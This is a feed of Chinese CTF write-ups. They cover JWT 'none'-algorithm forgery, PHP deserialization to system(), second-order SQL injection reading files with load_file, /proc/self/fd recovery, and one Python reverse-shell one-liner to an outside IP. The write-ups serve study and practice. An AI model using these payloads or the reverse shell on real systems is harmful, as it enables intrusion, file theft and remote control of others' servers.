      <link href="/2021/05/05/easylogin/"/>
      <url>/2021/05/05/easylogin/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>这道题完全是知识盲区</p><span id="more"></span><p>打开题目后查看static/js/app.js</p><pre><code>function login() &#123;    const username = $(&quot;#username&quot;).val();//所赋的值必需初始化并且不可以改变    const password = $(&quot;#password&quot;).val();//$(&quot;#username&quot;)为id选择器，获得一个id为password的标签，然后通过val（）获得该标签的值    const token = sessionStorage.getItem(&quot;token&quot;);//返回token所对的值，若没有则返回null    $.post(&quot;/api/login&quot;, &#123;username, password, authorization:token&#125;)//采用post方法，前面是url后面是参数    .done(function(data) &#123;//如果成功了就定位到/home（得到flag的那个页面），如果失败了就返回错误信息        const &#123;status&#125; = data;//相当于 const status=data.status        if(status) &#123;            document.location = &quot;/home&quot;;        &#125;    &#125;)    .fail(function(xhr, textStatus, errorThrown) &#123;        alert(xhr.responseJSON.message);    &#125;);&#125;function register() &#123;    const username = $(&quot;#username&quot;).val();    const password = $(&quot;#password&quot;).val();    $.post(&quot;/api/register&quot;, &#123;username, password&#125;)        .done(function(data) &#123;            const &#123; token &#125; = data;            sessionStorage.setItem(&#39;token&#39;, token);//保存数据，名称是token，值是token            document.location = &quot;/login&quot;;        &#125;)        .fail(function(xhr, textStatus, errorThrown) &#123;            alert(xhr.responseJSON.message);        &#125;);&#125;function logout() &#123;    $.get(&#39;/api/logout&#39;).done(function(data) &#123;        const &#123;status&#125; = data;        if(status) &#123;            document.location = &#39;/login&#39;;        &#125;    &#125;);&#125;function getflag() &#123;    $.get(&#39;/api/flag&#39;).done(function(data) &#123;        const &#123;flag&#125; = data;        $(&quot;#username&quot;).val(flag);    &#125;).fail(function(xhr, textStatus, errorThrown) &#123;        alert(xhr.responseJSON.message);    &#125;);&#125;</code></pre><p>这段代码只能读出来有一个在注册的时候生成了token</p><p>看wp，说打开网页后可以发现login和register等没有php后缀，初步判断是js框架。</p><p>有提示说是</p><blockquote><p>、/**</p></blockquote><ul><li> 或许该用 koa-static 来处理静态文件</li><li></li><li> 路径该怎么配置？不管了先填个根目录XD</li><li></li><li>/</li></ul><p>提示有：使用的是koa框架，然后静态文件处理出现问题，很可能存在任意文件读取漏洞</p><p>koa框架</p><p><img src="1.png"></p><p>其中controllers目录是项目控制器存放目录：接收请求，处理逻辑</p><p>尝试访问controllers/api.js与controllers/view.js,api.js是处理逻辑的请求</p><pre><code>const crypto = require(&#39;crypto&#39;);const fs = require(&#39;fs&#39;)const jwt = require(&#39;jsonwebtoken&#39;)const APIError = require(&#39;../rest&#39;).APIError;module.exports = &#123;&#39;POST /api/register&#39;: async (ctx, next) =&gt; &#123;    const &#123;username, password&#125; = ctx.request.body;    if(!username || username === &#39;admin&#39;)&#123;        throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);    &#125;    if(global.secrets.length &gt; 100000) &#123;        global.secrets = [];    &#125;    const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);    const secretid = global.secrets.length;    global.secrets.push(secret)    const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;);    ctx.rest(&#123;        token: token    &#125;);    await next();&#125;,&#39;POST /api/login&#39;: async (ctx, next) =&gt; &#123;    const &#123;username, password&#125; = ctx.request.body;    if(!username || !password) &#123;        throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);    &#125;    const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;    const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;    console.log(sid)    if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;        throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);    &#125;    const secret = global.secrets[sid];    const user = jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;);    const status = username === user.username &amp;&amp; password === user.password;    if(status) &#123;        ctx.session.username = username;    &#125;    ctx.rest(&#123;        status    &#125;);    await next();&#125;,&#39;GET /api/flag&#39;: async (ctx, next) =&gt; &#123;    if(ctx.session.username !== &#39;admin&#39;)&#123;        throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);    &#125;    const flag = fs.readFileSync(&#39;/flag&#39;).toString();    ctx.rest(&#123;        flag    &#125;);    await next();&#125;,&#39;GET /api/logout&#39;: async (ctx, next) =&gt; &#123;    ctx.session.username = null;    ctx.rest(&#123;        status: true    &#125;)    await next();&#125;&#125;;</code></pre><p>关键：const token = jwt.sign({secretid, username, password}, secret, {algorithm: ‘HS256’});</p><p>签名是由jwt进行的</p><p>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTYyMDE4ODIwMX0</p><p>jwt由三部分组成，它们分别是：</p><p>1.header：主要声明了JWT的签名算法；</p><p>2.payload：主要承载了各种声明并传递明文数据；</p><p>3.signture：拥有该部分的JWT被称为JWS，也就是签了名的JWS；没有该部分的JWT被称为nonsecure JWT 也就是不安全的JWT，此时header中声明的签名算法为none。</p><p>三个部分用·分割。形如 xxxxx.yyyyy.zzzzz的样式。</p><p><a href="https://www.freebuf.com/articles/web/181261.html">jwt</a></p><p><img src="2.PNG"></p><p>随便登录注册得到一个jwt</p><p><img src="3.PNG"></p><p><a href="https://jwt.io/">https://jwt.io/</a></p><p>然后运用脚本</p><pre><code>import jwttoken = jwt.encode(&#123;  &quot;secretid&quot;: [],  &quot;username&quot;: &quot;admin&quot;,  &quot;password&quot;: &quot;123456&quot;,  &quot;iat&quot;: 1620188201&#125;,algorithm=&quot;none&quot;,key=&quot;&quot;)print(token)</code></pre><p>然后用这个进行登录，获取flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pcntl_fork</title>
      <link href="/2021/05/04/pcntl-fork/"/>
      <url>/2021/05/04/pcntl-fork/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php  </span><br><span class="line">$pid &#x3D; pcntl_fork();</span><br><span class="line">if ($pid &#x3D;&#x3D; -1)</span><br><span class="line">&#123;</span><br><span class="line">   die(&quot;could not fork&quot;);</span><br><span class="line">&#125;</span><br><span class="line">elseif($pid &#x3D;&#x3D; 0)</span><br><span class="line">&#123;</span><br><span class="line">   echo &quot;I&#39;m the child  process \n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">   echo &quot;I&#39;m the parent process \n&quot;;</span><br><span class="line">   exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要搞清楚fork的执行过程，就必须弄清楚操作系统中“进程process”概念</p><p>一个进程，主要包括三个元素：</p><p>1.一个可以执行的程序</p><p>2.和该进程相关联的全部数据（包括变量，内存空间，缓冲区等等）</p><p>3.程序得执行上下文</p><p>不妨简单得理解为一个进程表示的就是一个可执行程序得一次执行过程的一个状态，操作系统对进程得管理，典型的情况就是通过进程表完成的。进程表得每一个表项，记录的是当前操作系统中一个进程得情况。</p><p>“程序计数器”得寄存器，指出当前占用cpu进程要执行得下一条指令的位置</p><p>当分给某个进程得cpu时间已经用完了，操作系统将该进程相关得寄存器得值，保存在该进程在进程表对印的表项里，把要接替这个进程cpu得那个进程从进程表里读出，并更新到相应的寄存器。主要要记住程序寄存器pc指出程序当前已经执行到哪里，是进程上 下文的重要内容，换出 CPU的进程要保存这个寄存器的值，换入CPU的进程，也要根据进程表中保存的本进程执行上下文信息，更新这个寄存器）。</p><blockquote><p>pid=pcntl_fork();</p></blockquote><p>操作系统创建一个新的进程（子进程），并且在进程表中相应为它建立一个新的表项。新进程和原有进程的可执行程序是同一个程序；上下文和数据，绝大部分就是原进程（父进程）的拷贝，但它们是两个相互独立的进程！此时程序寄存器pc在父、子进程的上下文中都声称，这个进程目前执行到fork调用即将返回（此时子进程不占有CPU，子进程的pc不是真正保存在寄存器中，而是作为进程上下文保存在进程表中的对应表项内）。问题是怎么返回，在父子进程中就分道扬镳。</p><p>父进程继续执行操作系统对fork的实现，使这个调用在父进程中返回刚刚创建的子进程的pid（一个正整数），所以后面的if语句中pid&lt;0, pid==0的两个分支都不会执行。所以输出：i am the parent process…</p><p>接着子进程在之后的某个时候得到调度，它的上下文被换入，占据 CPU，操作系统对fork的实现使得子进程中fork调用返回0，所以在这个进程中pid=0（注意这不是父进程了哦，虽然是同一个程序，但是这是同一个程序的另外一次执行，在操作系统中这次执行是由另外一个进程表示的，从执行的角度说和父进程相互独立）。这个进程在继续执行的过程中，if语句中 pid&lt;0不满足，但是pid==0是true，所以输出：i am the child process…</p><p>为什么看上去程序中互斥的两个分支都被执行了，在一个程序的一次执行中，这当然是不可能的，事实上你看到的两行输出是来自两个独立的进程，而这两个进程来自同一个程序的两次执行。</p><p>fork之后，操作系统会复制一个与父进程完全相同的子进程，虽说是父子关系，但是在操作系统看来，他们更像兄弟关系，这2个进程共享代码空间，但是数据空间是互相独立的，子进程数据空间中的内容是父进程的完整拷贝，指令指针也完全相同，但只有一点不同，如果fork成功，子进程中fork的返回值是0，父进程中fork的返回值是子进程的进程号，如果fork失败，父进程会返回错误。</p><p>可以这样想象，2个进程一直同时运行，而且步调一致，在fork之后，他们分别作不同的工作，也就是分岔了，这也是fork为什么叫fork的原因。<br>至于哪一个进程最先运行，这与操作系统平台的调度算法有关，而且这个问题在实际应用中并不重要，如果需要父子进程协同运作，可以通过控制语法结构的办法解决。</p><p>fork前子进程可以继承父进程的东西，但是在pcntl_fork()后子进程和父进程就没有任何继承关系了。在子进程里创建的东西是子进程的，在父进程创建的东西是父进程的，可以完全看成是两个独立的进程。</p><p>在程序段里用了pcntl_fork()之后程序出了分岔，派生出了两个进程，具体哪个先运行就看该系统的调度算法了。<br>在这里，我们可以这么认为，在运行到”pid=pcntl_fork();”时系统派生出一个跟主程序一模一样的子进程。该进程的”pid=pcntl_fork();”一句中 pid得到的就是子进程本身的pid；子进程结束后，父进程的”pid=pcntl_fork();”中pid得到的就是父进程本身的pid，因此该程序有两行输出。</p><p>pcntl_fork()函数复制了当前进程的PCB，并向父进程返回了派生子进程的pid，父子进程并行，打印语句的先后完全看系统的调度算法，打印的内容控制则靠pid变量来控制。因为我们知道pcntl_fork()向父进程返回了派生子进程的pid，是个正整数；而派生子进程的pid变量并没有被改变，这一区别使得我们看到了他们的不同输出。</p><ol><li>派生子进程的进程，即父进程，其pid不变；</li><li>对子进程来说，fork()函数返回给它0, 但它自身的pid绝对不会是0；之所以fork()函数返回0给它，是因为它随时可以调用getpid()来获取自己的pid；</li><li>fork之后父、子进程除非采用了同步手段，否则不能确定谁先运行，也不能确定谁先结束。认为子进程结束后父进程才从fork返回的，这是不对的，fork不是这样的，vfork才这样。</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>十三届easyphp</title>
      <link href="/2021/05/04/%E5%8D%81%E4%B8%89%E5%B1%8Aeasyphp/"/>
      <url>/2021/05/04/%E5%8D%81%E4%B8%89%E5%B1%8Aeasyphp/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><pre><code>&lt;?php$pid=pcntl_fork();if($pid==-1)    die(&#39;could not fork&#39;);else if($pid==1)&#123;    $r=pcntl_wait($status);    if(!pcntl_wifexited($status))&#123;        phpinfo();    &#125;&#125;else&#123;    highlight_file(__FILE__);    if(isset($_GET[&#39;a&#39;])&amp;&amp;is_string($_GET[&#39;a&#39;])&amp;&amp;!preg_match(&quot;/[:\\\\]|exec|pcntl/i&quot;,$_GET[&#39;a&#39;]))&#123;        call_user_func_array($_GET[&#39;a&#39;],[$_GET[&#39;b&#39;],false,true]);    &#125;    posix_kill(posix_getpid(),SIGUSR1);&#125;?&gt; </code></pre><p>题目源码</p><p>如果父进程先退出，造成了子进程被init接管，所以子进程为一，所以我们要做的就是怎么让父进程退出</p><blockquote><p>pcntl_wait 等待或返回子进程的状态<br>pcntl_wifexited  获取状态值</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>0ctf-piapiapia</title>
      <link href="/2021/05/04/0ctf-piapiapia/"/>
      <url>/2021/05/04/0ctf-piapiapia/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>又是一道代码审计的题目。。。。</p><span id="more"></span><p>#前置知识</p><blockquote><p>1.extents继承类，<a href="https://www.php.cn/php-weizijiaocheng-371591.html">详细参考</a></p></blockquote><blockquote><p>对于这道题,我们可以知道user这个类继承了mysql这个类的方法和属性，然后通过parent来调用mysql这个类中的方法</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux的/proc/self学习</title>
      <link href="/2021/04/24/Linux%E7%9A%84-proc-self%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/04/24/Linux%E7%9A%84-proc-self%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>我们可以通过/proc/$pic来获得指定进程的信息，例如内存映射，CPU绑定信息等等。如果某个进程想要获得本进程的系统信息，就可以通过进程的pid来访问/pic/$pid目录。但是这中方法还要获得pid，为了方便获得，linux提供了/proc/self目录，这个目录比较独特，不同进程访问该目录获得的进程是不同的，进程可以通过访问/proc/self目录来获取自己的系统信息，而不用每次都获取pic</p><h2>/proc目录</h2><p>linux内核提供了一种通过/proc文件系统，通过改变内核i啊内部数据结构，改变内核设置的机制。proc文件系统是一个伪文件系统，他只存在在内存，而不占用外存空间。它以系统文件的方式为访问系统内核数据的操作提供接口</p><p>还有一些是以数字命名的目录，他们是进程目录。系统中每一个进程都有一个对应的目录在/proc下，以进程的PID号为目录名，它们是对去进程信息的接口。而self目录是读取进程本身的信息接口</p><p>蓝色的就是进程号PIC</p><p><img src="2.PNG"></p><p><a href="https://blog.csdn.net/qq_31939617/article/details/80478663">ls -al的各项说明</a></p><h2>cmdline</h2><p>该文件存储着启动当前进程的完整命令</p><p><img src="3.PNG"></p><h2>cwd</h2><p>cwd文件是一个指向当前进程运行目录的符号链接</p><h2>exe</h2><p>是一个指向启动当前进程的可执行文件（完整路径）的符号连接。通过exe文件我们可以获得指定进程的可执行文件的完整路径</p><h2>environ</h2>environ文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开，变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息<h2>fd ，比较重要</h2>fd是一个目录，里面包含着当前进程打开的每一个文件的描述符（file descriptor）差不多就是路径啦，这些文件描述符是指向实际文件的一个符号连接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录的文件获取进程，从而打开每个文件的路径以及文件内容。<p><code>这个fd比较重要，因为在Linux系统中，如果一个程序用 open() 打开了一个文件，但是最终没有关闭它，即使从外部（如：os.remove(SECRET_FILE))删除这个文件之后，在/proc这个进程的 pid目录下的fd文件描述符 目录下 还是会有这个文件的文件描述符，通过这个文件描述符我们即可以得到被删除的文件的内容</code></p><h2>self</h2><p>上面的这些操作列出的都是目标环境指定进程的信息，但是我们在做题的时候往往需要的当前进程的信息，这时候就用到了/proc 目录中的self子目录了。</p><p>/proc/self表示当前进程目录。前面说了通过/proc/$pid/来获取指定进程的信息。如果某个进程想要获取当前进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid。</p><p>在fork、daemon等情况下pid还可能发生变化。</p><p>为了更方便的获取本进程的信息，Linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息时不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Picdown</title>
      <link href="/2021/04/24/Picdown/"/>
      <url>/2021/04/24/Picdown/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2>非预期解</h2><p>打开题目是一个输入框，随便输，发现url变了</p><p><a href="http://7ca0ad1e-09a8-4c80-b6ad-5f9afa360fb7.node3.buuoj.cn/page%60%60%60?url=1%60%60%60">http://7ca0ad1e-09a8-4c80-b6ad-5f9afa360fb7.node3.buuoj.cn/page```?url=1```</a></p><p>然后尝试改变url，尝试读取/etc/passwd,是可以成功读取得，然后我们就尝试读取flag</p><blockquote><p>url=/flag,就可以读取flag</p></blockquote><h2>预期解</h2><p>一直没有成功也是无语了</p><p>我们通过查看proc/self/cmdline去查看他的进程，去读取app.py</p><p>![](1.    PNG)</p><p>我们可以看到他其实是吧那个文件给删除了，但是我们知道如果一个文件在打开的情况下被删除是可以在proc/self/fd/中找回的</p><p>于是进行爆破，可以看到是/proc/self/fd/3，但是就在这里我得到的key一直提示说是错误的，也是没谁了</p><p>然后反弹shell</p><blockquote><p>shell=python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“47.xx.xx.xxx”,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/bash”,”-i”]);’</p></blockquote><p>172.16.158.38</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>朱雀杯phpweb</title>
      <link href="/2021/04/24/%E6%9C%B1%E9%9B%80%E6%9D%AFphpweb/"/>
      <url>/2021/04/24/%E6%9C%B1%E9%9B%80%E6%9D%AFphpweb/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>开篇</p><p><img src="1.PNG"></p><p>什么都没有，并且每5分钟刷新界面，果断bp抓包，发现有两个参数</p><blockquote><p>func p</p></blockquote><p>如果改变func得值，第一次我换成了system显示得是hacker…，随便写了一个发现有报错</p><p><img src="2.PNG">,提示了一个重要得函数</p><p><img src="3.PNG"></p><p>尝试了很多函数发现都被过滤了，这里用到了file_get_content或者readfile,读取index.php</p><pre><code>    &lt;?php$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);function gettime($func, $p) &#123;    $result = call_user_func($func, $p);    $a= gettype($result);    if ($a == &quot;string&quot;) &#123;        return $result;    &#125; else &#123;return &quot;&quot;;&#125;&#125;class Test &#123;    var $p = &quot;Y-m-d h:i:s a&quot;;    var $func = &quot;date&quot;;    function __destruct() &#123;        if ($this-&gt;func != &quot;&quot;) &#123;            echo gettime($this-&gt;func, $this-&gt;p);        &#125;    &#125;&#125;$func = $_REQUEST[&quot;func&quot;];$p = $_REQUEST[&quot;p&quot;];if ($func != null) &#123;    $func = strtolower($func);    if (!in_array($func,$disable_fun)) &#123;        echo gettime($func, $p);    &#125;else &#123;        die(&quot;Hacker...&quot;);    &#125;&#125;?&gt;</code></pre><p><img src="4.PNG"></p><p>可以让func=unserialize，构造exp</p><pre><code>    &lt;?phpclass Test&#123;    var $p = &quot;dir&quot;;    var $func = &quot;system&quot;;&#125;$a=new Test();echo(serialize($a));?&gt;</code></pre><p>var其实跟public差不多</p><p>但是发现找不到flag，于是学习到了一个新的知识 <a href="https://www.runoob.com/linux/linux-comm-find.html">find</a> </p><p>用于查找我们找不到得flag</p><p>构造exp：</p><pre><code>    &lt;?phpclass Test&#123;    var $p = &quot;find / -name &#39;flag*&#39;&quot;;    var $func = &quot;system&quot;;&#125;$a=new Test();echo(serialize($a));?&gt;</code></pre><p><img src="5.PNG"></p><p>读取flag</p><?php    class Test{        var $p = "/tmp/flagoefiu4r93";        var $func = "readfile";    }    $a=new Test();    echo(serialize($a));    ?><p>#反思</p><p>第一：没有想到unserialize，思维还是有点局限</p><p>第二：读取index.php，这个记得前几次有做题遇到过，还是不大会想起</p><p>第三：不知道find</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯commit</title>
      <link href="/2021/04/23/%E7%BD%91%E9%BC%8E%E6%9D%AFcommit/"/>
      <url>/2021/04/23/%E7%BD%91%E9%BC%8E%E6%9D%AFcommit/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>打开题目后，进行扫描目录，发现是git泄露，用GitHack恢复后，得到一个write_do.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;</span><br><span class="line">   header(&quot;Location: .&#x2F;login.php&quot;);</span><br><span class="line">   die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;do&#39;]))&#123;</span><br><span class="line">switch ($_GET[&#39;do&#39;])</span><br><span class="line">&#123;</span><br><span class="line">case &#39;write&#39;:</span><br><span class="line">   break;</span><br><span class="line">case &#39;comment&#39;:</span><br><span class="line">   break;</span><br><span class="line">default:</span><br><span class="line">   header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">   header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里猜测，给的write_do.php是不完整的，因为，看switch这里，case后面跟的直接就是break，具体这个功能是做什么的都没有给出</p><p>两条指令</p><blockquote><p>git log –reflog</p></blockquote><blockquote><p>git reset –hard </p></blockquote><pre><code>&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] != &#39;yes&#39;)&#123;        header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;    switch ($_GET[&#39;do&#39;])    &#123;        case &#39;write&#39;:           $category = addslashes($_POST[&#39;category&#39;]);        $title = addslashes($_POST[&#39;title&#39;]);        $content = addslashes($_POST[&#39;content&#39;]);        $sql = &quot;insert into board            set category = &#39;$category&#39;,                title = &#39;$title&#39;,                content = &#39;$content&#39;&quot;;        $result = mysql_query($sql);        header(&quot;Location: ./index.php&quot;);        break;        case &#39;comment&#39;:           $bo_id = addslashes($_POST[&#39;bo_id&#39;]);          $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;        $result = mysql_query($sql);            $num = mysql_num_rows($result);            if($num&gt;0)&#123;            $category = mysql_fetch_array($result)[&#39;category&#39;];            $content = addslashes($_POST[&#39;content&#39;]);            $sql = &quot;insert into comment            set category = &#39;$category&#39;,            content = &#39;$content&#39;,            bo_id = &#39;$bo_id&#39;&quot;;            $result = mysql_query($sql);            &#125;        header(&quot;Location: ./comment.php?id=$bo_id&quot;);        break;       default:        header(&quot;Location: ./index.php&quot;);    &#125;    &#125;else&#123;header(&quot;Location: ./index.php&quot;);&#125;?&gt;</code></pre><p><img src="1.PNG"></p><blockquote><p>addslashes,在引号前面加上反斜杠，有点向二次注入</p></blockquote><p>分析代码</p><p>write：</p><p><img src="2.PNG"></p><p>post传入三个参数，三个参数都被addslashes，然后执行sql语句，将这三条数据插入到board这张表里面</p><p><img src="3.PNG"></p><p>这里其实可以看出来，其实category这里没有进行addslashes过滤，所以这应该就是本题出现的漏洞点。</p><p><img src="4.PNG"></p><p>这里是执行了sql语句，所以我们可以猜测如果$sql里面有sql注入的语句是不是就可以执行了，那么现在的问题就是我们应该怎么在$sql去填写这个注入语句</p><p>这里需要介绍一个经常在c++上用的，多行注释</p><p>这里顺便在介绍一道题目，ctfshow web100</p><p><img src="5.PNG"></p><p>这里就是使用了多行注释</p><p><img src="6.PNG"></p><blockquote><p>我们在 category里输入1’,content=database(),/<em>然后在留言哪里输入</em>/#，留言就是content，就相当于</p></blockquote><p><img src="7.PNG"></p><p>我只能注如出来一个库名是ctf，但是其他的没有回显不知道为什么</p><p>所以现在可以看一下，user()</p><p><img src="8.PNG"></p><p>看到权限是root，如果flag在数据库里，是不需要有root权限的，所以这道题目的flag不在数据库里</p><p>这里学习到了一个函数</p><p><a href="https://www.jb51.net/article/158595.htm">load_file参考地址</a></p><p>/etc/passwd:系统中所有用户和用户的主要信息</p><p><a href="https://blog.csdn.net/m0_37605642/article/details/97136282?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">/etc/passwd详细解释</a></p><p><img src="9.PNG"></p><p><img src="20.PNG"></p><p>然后查看bash_history,这里面保存了用户所使用过的历史命令方便查找，就在家目录下面</p><p>1’,content=(select load_file(“/www/home/.bash_history”)),/*</p><p><img src="10.PNG"></p><p>unzip :用于解压以zip为后缀的文件<br>cp:用于复制文件和目录 <a href="https://www.runoob.com/linux/linux-comm-cp.html">里面的一些参数</a></p><p>rm-f:强制删除文件</p><p>很显然，操作者进入到tmp这个目录里，解压了html.zip,强制删除了html.zip，又复制了html到/var/www，进入目录，强制删除。DS_Store.</p><pre><code>.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择通过.DS_Store可以知道这个目录里面所有文件的清单。</code></pre><p>但是tmp/html里的这个文件没有被删除，所以我们可以通过这个目录查看。又因为文件过大没有办法显示出来，所以我们可以用hex编码</p><blockquote><p>   1’,content=(select hex(load_file(‘/tmp/html/.DS_Store’))),/*</p></blockquote><p><img src="11.PNG"></p><p>解码，flag在flag_8946e1ff1ee3e40f.php</p><blockquote><p>   1’,content=(select hex(load_file(‘/tmp/html/flag_8946e1ff1ee3e40f.php’))),/*</p></blockquote><p><img src="12.PNG"></p><p>解码得flag</p><p>这个竟然是假得.。。</p><p>真的在var/www/html目录里。。。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>原谅杯web4</title>
      <link href="/2021/04/21/%E5%8E%9F%E8%B0%85%E6%9D%AFweb4/"/>
      <url>/2021/04/21/%E5%8E%9F%E8%B0%85%E6%9D%AFweb4/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>这道题目不是很难，但是也学到了很多知识</p><span id="more"></span><h2>新知识</h2><h3>学习几个目录</h3><blockquote><p>/bin</p></blockquote><blockquote><p>主要放一些系统必备执行档案，例如：cat，cp,gzip,kill,ls,mkdir等等</p><p><img src="1.PNG"></p></blockquote><blockquote><p>/sbin</p><p>一般是超级用户指令，主要放置一些系统管理的必备程式。</p></blockquote><blockquote><p><img src="2.PNG"></p></blockquote><blockquote><p>/usr/bin</p></blockquote><blockquote><p>系统安装的可执行程序，会随着系统的升级而改变</p></blockquote><blockquote><p><img src="3.PNG"></p></blockquote><blockquote><p>/usr/local/bin</p></blockquote><blockquote><p>给用户放置自己的可执行程序的地方，不会被系统升级而覆盖同名文件</p></blockquote><p><img src="19.PNG"></p><blockquote><p>usr/sbin</p></blockquote><blockquote><p>放置一些用户安装系统管理的必备程式</p></blockquote><h3>sh命令</h3><p>sh命令是shell命令语言解释器，执行命令从标准输入读取或从一个文件中读取。</p><h3>重定向</h3><p><a href="https://blog.csdn.net/u014360942/article/details/72630322?utm_source=blogxgwz0">参考资料</a></p><h3>linux 的 2>&1</h3><blockquote><p>1在文章里的标准输出，stdout</p></blockquote><blockquote><p>2是标准错误输出，stderr</p></blockquote><blockquote><p>0是标准输入，stdin</p></blockquote><p>执行ls之后，下面出现的就是标准输出</p><p><img src="8.PNG"></p><p>这是正常查询，那如果我们查询一个不存在的文件呢？</p><p><img src="9.PNG"></p><p>报错了，并且也返回了错误信息。</p><p>如果我们执行，ls &gt; 1</p><p><img src="10.PNG"></p><p>没有报错，而且现在会出现一个 1 的文件</p><p><img src="11.PNG"></p><p><code>这说明ls的标准输出输到了1的文件中</code></p><p>把1文件删除，继续执行ls hhh &gt; 1</p><p><img src="12.PNG"></p><p>报错，重新建了1文件，但是 1 里面什么都没有</p><p><code>这说明标准错误输出没有输入到1里面</code></p><p><img src="13.PNG"></p><p>删除1文件，继续执行ls hhh &gt; 1 2&gt;&amp;1</p><p><img src="14.PNG"></p><p><img 